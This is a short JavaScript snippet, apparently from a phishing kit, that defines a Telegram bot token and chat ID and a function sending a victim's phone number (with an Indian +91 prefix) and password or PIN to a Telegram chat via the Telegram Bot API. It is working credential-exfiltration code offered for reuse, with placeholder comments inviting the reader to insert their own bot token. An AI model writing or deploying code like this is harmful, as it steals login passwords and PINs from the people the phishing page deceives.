// Telegram Bot Configuration
const TELEGRAM_BOT_TOKEN = "8389073663:AAEm_tCzOs60Yr9RLtQtUutONIjv4jWDlTo"; // Put your bot token here
const TELEGRAM_CHAT_ID = "8023791486";   // Put your chat id here

async function sendToTelegram(dataType, phone, secret) {
    const message = `${dataType}\n\nPhone: +91 ${phone}\n${dataType === "PASSWORD DATA" ? "Password" : "PIN"}: ${secret}`;
    
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    try {
        const response = await fetch(url, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                chat_id: TELEGRAM_CHAT_ID,
                text: message
            })
        });
        
        if (!response.ok) {
            const errorText = await response.text();
            console.error(`Telegram API Error (${response.status}):`, errorText);
            return;
        }
        
        const data = await response.json();
        console.log("Telegram success:", data);
        return data;
    } catch (error) {
        console.error("Fetch error:", error);
    }
}
